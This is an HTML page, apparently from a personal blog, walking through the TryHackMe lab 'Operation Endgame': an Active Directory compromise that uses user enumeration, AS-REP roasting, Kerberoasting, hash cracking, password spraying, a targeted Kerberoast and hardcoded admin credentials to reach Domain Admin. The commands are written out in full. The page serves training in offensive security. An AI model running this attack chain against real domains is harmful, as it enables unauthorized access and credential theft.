@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Offensive security writeup — penetration testing lab walkthrough.">
+    <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe, cybersecurity, ethical hacking">
+    <meta name="author" content="xlondra">
+    <meta name="robots" content="index, follow">
+    <title>Tryhackme - Operation Endgame - Walktrough — xlondra</title>
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+
+    <link rel="stylesheet" href="../../../assets/css/writeup.css">
+    <link rel="stylesheet" href="../../../assets/css/global.css">
+    <link rel="stylesheet" href="../../../assets/css/index.css">
+    <link rel="stylesheet" href="../../../assets/css/code.css">
+    <link rel="stylesheet" href="../../../assets/css/explain.css">
+
+    <script src="../../../assets/js/nav.js" defer></script>
+    <script src="../../../assets/js/footer.js" defer></script>
+    <script src="../../../assets/js/zoomer.js" defer></script>
+    <script src="../../../assets/js/writeup.js" defer></script>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali:~$&nbsp;</span>
+                <span class="typed"></span><span class="cursor">▋</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+                <a href="#" class="nav-exit">exit</a>
+            </div>
+            <div class="hamburger-button">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor">
+                    <path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/>
+                </svg>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="writeup">
+            <div class="lab-header">
+                <h1 class="lab-title">Tryhackme - Operation Endgame - Walktrough</h1>
+
+                <ul class="lab-meta">
+                    <li><strong>Date</strong> 2026-03-06</li>
+                    <li><strong>Platform</strong> TryHackMe</li>
+                    <li><strong>Difficulty</strong> Hard</li>
+                    <li><strong>Team</strong> <span class="team-badge red">Red Team</span></li>
+                    <li><strong>Link</strong> <a href="https://tryhackme.com/room/operationendgame" target="_blank" rel="noopener noreferrer">Open Lab ↗</a></li>
+                    <li><strong>Tags</strong> <span class="tag">AD</span> <span class="tag">Windows</span></li>
+                </ul>
+            </div>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Summary</h2>
+
+                <p>Enumerating the target network reveals an Active Directory Domain Controller. Authenticating to SMB as guest with a blank password, we enumerate all domain users via RID brute forcing. Using the guest account to Kerberoast, we retrieve and crack the TGS hash of CODY_ROY. Spraying CODY_ROY's cracked password across all domain users reveals that ZACHARY_HUNT reuses the same password. BloodHound analysis shows ZACHARY_HUNT has GenericWrite over JERRI_LANCASTER, allowing a Targeted Kerberoast attack to obtain and crack JERRI_LANCASTER's hash. Logging in as JERRI_LANCASTER reveals a PowerShell script in C:\Scripts containing hardcoded Domain Admin credentials for SANFORD_DAUGHERTY. Authenticating via RDP and launching an elevated shell to bypass UAC, we retrieve the flag from the Administrator's desktop.</p>
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Reconnaissance</h2>
+
+                <p>Let's start off by executing an nmap scan.</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="sudo nmap -p- -sV -sC -T4 TARGET_IP">└─$ sudo nmap -p- -sV -sC -T4 TARGET_IP</code></pre>
+</div>
+                <div class="command-wrapper output-block">
+    <div class="output-label">sudo nmap -p- -sV -sC -T4 TARGET_IP</div>
+    <pre><code data-copy-content="Nmap scan report for 10.130.170.53&#10;Host is up (0.025s latency).&#10;Not shown: 65505 closed tcp ports (reset)&#10;PORT      STATE SERVICE           VERSION&#10;53/tcp    open  domain            Simple DNS Plus&#10;80/tcp    open  http              Microsoft IIS httpd 10.0&#10;| http-methods:&#10;|_  Potentially risky methods: TRACE&#10;|_http-server-header: Microsoft-IIS/10.0&#10;|_http-title: IIS Windows Server&#10;88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-03 13:32:27Z)&#10;135/tcp   open  msrpc             Microsoft Windows RPC&#10;139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn&#10;389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)&#10;443/tcp   open  ssl/https?&#10;| tls-alpn:&#10;|   h2&#10;|_  http/1.1&#10;|_ssl-date: 2026-06-03T13:34:21+00:00; 0s from scanner time.&#10;| ssl-cert: Subject: commonName=thm-LABYRINTH-CA&#10;| Not valid before: 2023-05-12T07:26:00&#10;|_Not valid after:  2028-05-12T07:35:59&#10;445/tcp   open  microsoft-ds?&#10;464/tcp   open  kpasswd5?&#10;593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0&#10;636/tcp   open  ldapssl?&#10;3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)&#10;3269/tcp  open  globalcatLDAPssl?&#10;3389/tcp  open  ms-wbt-server     Microsoft Terminal Services&#10;| ssl-cert: Subject: commonName=ad.thm.local&#10;| Not valid before: 2026-06-02T13:24:54&#10;|_Not valid after:  2026-12-02T13:24:54&#10;|_ssl-date: 2026-06-03T13:34:21+00:00; 0s from scanner time.&#10;| rdp-ntlm-info:&#10;|   Target_Name: THM&#10;|   NetBIOS_Domain_Name: THM&#10;|   NetBIOS_Computer_Name: AD&#10;|   DNS_Domain_Name: thm.local&#10;|   DNS_Computer_Name: ad.thm.local&#10;|   Product_Version: 10.0.17763&#10;|_  System_Time: 2026-06-03T13:33:17+00:00&#10;9389/tcp  open  mc-nmf            .NET Message Framing&#10;47001/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&#10;|_http-server-header: Microsoft-HTTPAPI/2.0&#10;|_http-title: Not Found&#10;49664/tcp open  msrpc             Microsoft Windows RPC&#10;49665/tcp open  msrpc             Microsoft Windows RPC&#10;49666/tcp open  msrpc             Microsoft Windows RPC&#10;49667/tcp open  msrpc             Microsoft Windows RPC&#10;49669/tcp open  msrpc             Microsoft Windows RPC&#10;49670/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0&#10;49671/tcp open  msrpc             Microsoft Windows RPC&#10;49675/tcp open  msrpc             Microsoft Windows RPC&#10;49676/tcp open  msrpc             Microsoft Windows RPC&#10;49681/tcp open  msrpc             Microsoft Windows RPC&#10;49694/tcp open  msrpc             Microsoft Windows RPC&#10;49716/tcp open  msrpc             Microsoft Windows RPC&#10;49718/tcp open  msrpc             Microsoft Windows RPC&#10;49784/tcp open  msrpc             Microsoft Windows RPC&#10;Service Info: Host: AD; OS: Windows; CPE: cpe:/o:microsoft:windows&#10;&#10;Host script results:&#10;| smb2-security-mode:&#10;|   3.1.1:&#10;|_    Message signing enabled and required&#10;| smb2-time:&#10;|   date: 2026-06-03T13:33:18&#10;|_  start_date: N/A">Nmap scan report for 10.130.170.53
+Host is up (0.025s latency).
+Not shown: 65505 closed tcp ports (reset)
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+80/tcp    open  http              Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-03 13:32:27Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
+443/tcp   open  ssl/https?
+| tls-alpn:
+|   h2
+|_  http/1.1
+|_ssl-date: 2026-06-03T13:34:21+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
+| Not valid before: 2023-05-12T07:26:00
+|_Not valid after:  2028-05-12T07:35:59
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
+| ssl-cert: Subject: commonName=ad.thm.local
+| Not valid before: 2026-06-02T13:24:54
+|_Not valid after:  2026-12-02T13:24:54
+|_ssl-date: 2026-06-03T13:34:21+00:00; 0s from scanner time.
+| rdp-ntlm-info:
+|   Target_Name: THM
+|   NetBIOS_Domain_Name: THM
+|   NetBIOS_Computer_Name: AD
+|   DNS_Domain_Name: thm.local
+|   DNS_Computer_Name: ad.thm.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-06-03T13:33:17+00:00
+9389/tcp  open  mc-nmf            .NET Message Framing
+47001/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc             Microsoft Windows RPC
+49665/tcp open  msrpc             Microsoft Windows RPC
+49666/tcp open  msrpc             Microsoft Windows RPC
+49667/tcp open  msrpc             Microsoft Windows RPC
+49669/tcp open  msrpc             Microsoft Windows RPC
+49670/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc             Microsoft Windows RPC
+49675/tcp open  msrpc             Microsoft Windows RPC
+49676/tcp open  msrpc             Microsoft Windows RPC
+49681/tcp open  msrpc             Microsoft Windows RPC
+49694/tcp open  msrpc             Microsoft Windows RPC
+49716/tcp open  msrpc             Microsoft Windows RPC
+49718/tcp open  msrpc             Microsoft Windows RPC
+49784/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Host: AD; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2026-06-03T13:33:18
+|_  start_date: N/A</code></pre>
+</div>
+                <p>The Nmap scan reveals a Windows Domain Controller with several key services exposed: DNS (53), Kerberos (88), LDAP (389), SMB (445), and RDP (3389). The LDAP and RDP banners confirm the domain name is thm.local and the machine hostname is AD. We add <b>thm.local</b> and <b>AD.thm.local</b> to <b>/etc/hosts</b> pointing to the target IP for easier name resolution. With a Domain Controller identified, our focus is now Active Directory enumeration.</p>
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Enumeration</h2>
+
+                <p>Lets first enumerate users using <b>Kerbrute</b>:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content=" kerbrute userenum -d thm.local --dc thm.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt">└─$  kerbrute userenum -d thm.local --dc thm.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</code></pre>
+</div>
+                <img src="images/userEnumed.png" class="lab-image zoomable" alt="Operation Endgame - User Enum">
+                <p>I found 2 valid users using Kerbrute. I tried the xato million user list, but it only returned the same 2 usernames, the default built-in accounts:<br>
+> <b>guest</b><br>
+> <b>administrator</b></p>
+                <p>I performed an AS-REP Roasting attack using Impacket's GetNPUsers. This technique targets accounts that have Kerberos pre-authentication disabled, a misconfiguration that allows anyone to request an AS-REP from the Domain Controller without supplying credentials. The DC's response contains data encrypted with the user's password hash, which can be taken offline and cracked using a wordlist.</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="impacket-GetNPUsers thm.local/ -dc-ip thm.local -no-pass -usersfile users.txt">└─$ impacket-GetNPUsers thm.local/ -dc-ip thm.local -no-pass -usersfile users.txt</code></pre>
+</div>
+                <p>Although this didn't yield results, I was able to enumerate more users by authenticating as <b>guest</b> with a blank password:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="impacket-lookupsid thm.local/guest@thm.local -no-pass | grep SidTypeUser | awk -F'\' '{print $2}' | awk '{print $1}' &gt; users.txt  ">└─$ impacket-lookupsid thm.local/guest@thm.local -no-pass | grep SidTypeUser | awk -F'\' '{print $2}' | awk '{print $1}' &gt; users.txt  </code></pre>
+</div>
+                <p>This command enumerates users and writes them to a file called users.txt. With the full user list in hand, I ran the same AS-REP Roasting attack again. This time with more success, a total of 5 users were found vulnerable:<br>
+> MAXINE_FREEMAN<br>
+> PHYLLIS_MCCOY<br>
+> QUEEN_GARNER<br>
+> ISIAH_WALKER<br>
+> SHELLEY_BEARD<br>
+I tried cracking all hashes with Hashcat against the rockyou wordlist, but without success.</p>
+                <p>With a valid (but low-privilege) guest session, I used impacket-GetUserSPNs to query the DC for accounts with registered Service Principal Names. </p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="impacket-GetUserSPNs thm.local/guest: -dc-ip thm.local -no-pass -request">└─$ impacket-GetUserSPNs thm.local/guest: -dc-ip thm.local -no-pass -request</code></pre>
+</div>
+                <details class="command-explanation">
+    <summary>What this does</summary>
+    <p><b>thm.local/guest</b>: authenticating as guest with a blank password<br>
+<b>-dc-ip thm.local</b>: Specifying where the Domain Controller lives<br>
+<b>-no-pass</b>: Don't prompt for a password<br>
+<b>-request</b>: Actually retrieve the TGS tickets, not just list the SPNs</p>
+</details>
+                <p>It found the Kerberos 5 hash of user <b>CODY_ROY</b>:</p>
+                <img src="images/SPN.png" class="lab-image zoomable" alt="Operation Endgame - SPN">
+                <p>Because Kerberos allows any authenticated domain user to request service tickets, no elevated privileges were required. The DC issued a TGS for <b>CODY_ROY</b> encrypted with that account's password hash. I cracked the hash using hashcat:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="hashcat -m 13100 -a 0 hashes.txt rockyou.txt">└─$ hashcat -m 13100 -a 0 hashes.txt rockyou.txt</code></pre>
+</div>
+                <img src="images/cracked.png" class="lab-image zoomable" alt="Operation Endgame - Cracked hash">
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Exploitation</h2>
+
+                <p>As seen in the output of <b>impacket-GetUserSPNs</b> user CODY_ROY is part of the RDP users. Which means we can start a RDP session as CODY_ROY with the following command:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="xfreerdp3 /cert:ignore /v:thm.local /u:'CODY_ROY' /p:'MKO)mko0' /dynamic-resolution /drive:.,linux /auto-reconnect /clipboard /compression /bpp:8 /audio-mode:0 -window-drag -themes -wallpaper">└─$ xfreerdp3 /cert:ignore /v:thm.local /u:'CODY_ROY' /p:'MKO)mko0' /dynamic-resolution /drive:.,linux /auto-reconnect /clipboard /compression /bpp:8 /audio-mode:0 -window-drag -themes -wallpaper</code></pre>
+</div>
+                <p>Logging in via RDP confirmed the credentials are valid. Although the session was heavily restricted by Group Policy, preventing us from opening Explorer or interacting with the desktop, we successfully authenticated as CODY_ROY, which is enough to proceed with further enumeration.</p>
+                <p>We can use BloodHound to calculate the shortest path to Domain Admin. First, we need to import the data into BloodHound. We can generate a zip file containing all domain data collected using CODY_ROY's credentials and feed it to BloodHound:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="bloodhound-ce-python -u CODY_ROY -p 'PASSWORD' -d thm.local -dc AD.thm.local -ns TARGET_IP -c All --zip">└─$ bloodhound-ce-python -u CODY_ROY -p 'PASSWORD' -d thm.local -dc AD.thm.local -ns TARGET_IP -c All --zip</code></pre>
+</div>
+                <p>Then in BloodHound go to <b>Explore > Pathfinding</b> and enter <b>CODY_ROY@THM.LOCAL</b> as the start node and <b>DOMAIN ADMINS@THM.LOCAL</b> as the destination node:</p>
+                <img src="images/ShortestPath.png" class="lab-image zoomable" alt="Operation Endgame - bloodhound network">
+                <p>Although BloodHound reveals a theoretical path to Domain Admin through the GUESTS group and TIER 2 OU, exploiting this path proved impractical. Instead, we pivot to password spraying, a technique that checks whether CODY_ROY's cracked password is reused by other domain accounts, a common misconfiguration in enterprise environments. Using NetExec, we sprayed CODY_ROY's cracked password against the full user list:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="netexec smb 10.128.166.23 -u users.txt -p 'CODY_ROY_PASSWORD_HERE' --no-bruteforce --continue-on-success">└─$ netexec smb 10.128.166.23 -u users.txt -p 'CODY_ROY_PASSWORD_HERE' --no-bruteforce --continue-on-success</code></pre>
+</div>
+                <p>This revealed that ZACHARY_HUNT reuses the same password as seen in the image:</p>
+                <img src="images/Screenshot_20260603_221248.png" class="lab-image zoomable" alt="Operation Endgame - Zachery">
+                <p>Returning to BloodHound with ZACHARY_HUNT marked as owned, by entering the following Cypher query in bloodhound we identified that this account has <b>GenericWrite</b> over JERRI_LANCASTER. </p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="MATCH p=(u:User {name:&quot;ZACHARY_HUNT@THM.LOCAL&quot;})-[r]-&gt;(n) RETURN p">└─$ MATCH p=(u:User {name:&quot;ZACHARY_HUNT@THM.LOCAL&quot;})-[r]-&gt;(n) RETURN p</code></pre>
+</div>
+                <img src="images/genericWrite.png" class="lab-image zoomable" alt="Operation Endgame - Generic Write">
+                <p>GenericWrite allows us to write to select attributes of the target object, in this case we can set a fake SPN on JERRI_LANCASTER, enabling a Targeted Kerberoast attack:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="python3 targetedKerberoast.py -u ZACHARY_HUNT -p 'PASSWORD_HERE' -d thm.local --dc-ip 10.128.150.65 --only-abuse --request-user JERRI_LANCASTER">└─$ python3 targetedKerberoast.py -u ZACHARY_HUNT -p 'PASSWORD_HERE' -d thm.local --dc-ip 10.128.150.65 --only-abuse --request-user JERRI_LANCASTER</code></pre>
+</div>
+                <img src="images/roastedWhoopWhoop.png" class="lab-image zoomable" alt="Operation Endgame - kerberoasted JERRI!">
+                <p>It returned the <b>Kerberos 5</b> hash of JERRI_LANCASTER. I cracked the hash using hashcat:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="hashcat -m 13100 -a 0 hash.txt rockyou.txt">└─$ hashcat -m 13100 -a 0 hash.txt rockyou.txt</code></pre>
+</div>
+                <img src="images/RoastedAndCrackedWhoopWhoop.png" class="lab-image zoomable" alt="Operation Endgame  - Cracked Password">
+            </section>
+            <section class="writeup-section">
+                <h2 class="section-title">Post-Exploitation</h2>
+
+                <p>We log in as JERRI_LANCASTER via RDP using the following command:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="xfreerdp3 /cert:ignore /v:10.128.150.65 /u:'JERRI_LANCASTER' /p:'CRACKED_PASSWORD' /dynamic-resolution">└─$ xfreerdp3 /cert:ignore /v:10.128.150.65 /u:'JERRI_LANCASTER' /p:'CRACKED_PASSWORD' /dynamic-resolution</code></pre>
+</div>
+                <p>The Windows environment is still pretty restricted. However, we can open a PowerShell window by holding Shift and right-clicking the Desktop, then selecting "Open PowerShell window here". Navigating to <b>C:\ </b>revealed the <b>C:\Scripts\</b> folder, which contained a PowerShell script:</p>
+                <img src="images/powershellScript.png" class="lab-image zoomable" alt="Operation Endgame - Powershell script">
+                <p>Reading the file in PowerShell reveals the hardcoded password of user <b>SANFORD_DAUGHERTY</b>.</p>
+                <img src="images/foundPassword.png" class="lab-image zoomable" alt="Operation Endgame - SANFORD password">
+                <p>I entered SANFORD_DAUGHERTY in BloodHound and found out that this user is a Domain Admin:</p>
+                <img src="images/MemberOfAdmins.png" class="lab-image zoomable" alt="Operation Endgame - Admin Found">
+                <p>Let's try to log in as SANFORD_DAUGHERTY via RDP:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="xfreerdp3 /cert:ignore /v:10.128.150.65 /u:'SANFORD_DAUGHERTY' /p:'SANFORD_PASSWORD' /dynamic-resolution">└─$ xfreerdp3 /cert:ignore /v:10.128.150.65 /u:'SANFORD_DAUGHERTY' /p:'SANFORD_PASSWORD' /dynamic-resolution</code></pre>
+</div>
+                <p>I tried listing the files and directories in the admin users folder, but I still received "Access Denied":</p>
+                <img src="images/AccessDeniedWhat.png" class="lab-image zoomable" alt="Operation Endgame - Access Denied">
+                <p>Although SANFORD_DAUGHERTY is a member of Domain Admins, the <b>whoami /all</b> output shows the group listed as "Group used for deny only". This is a result of UAC (User Account Control), when logging in via RDP, Windows creates a medium integrity token that strips elevated group memberships. To obtain a high integrity token with full Domain Admin privileges, we need to explicitly launch an elevated process. We can do so by executing the following command inside Powershell:</p>
+                <div class="command-wrapper">
+    <pre><code data-copy-content="Start-Process powershell -Verb RunAs">└─$ Start-Process powershell -Verb RunAs</code></pre>
+</div>
+                <p>This spawns a shell as Administrator in <b>C:\Windows\system32</b>. With that being said, lets retrieve the one and only flag:</p>
+                <img src="images/FoundFlag.png" class="lab-image zoomable" alt="Operation Endgame - Found Flag">
+                <p>Thank you for following along, I hope you learned something new today. I certainly did. Have a nice rest of your day!</p>
+            </section>
+        </article>
+    </main>
+
+    <footer>
+        Copyleft &copy; <span id="year"></span> &nbsp;·&nbsp; xlondra
+    </footer>
+</body>
+</html>
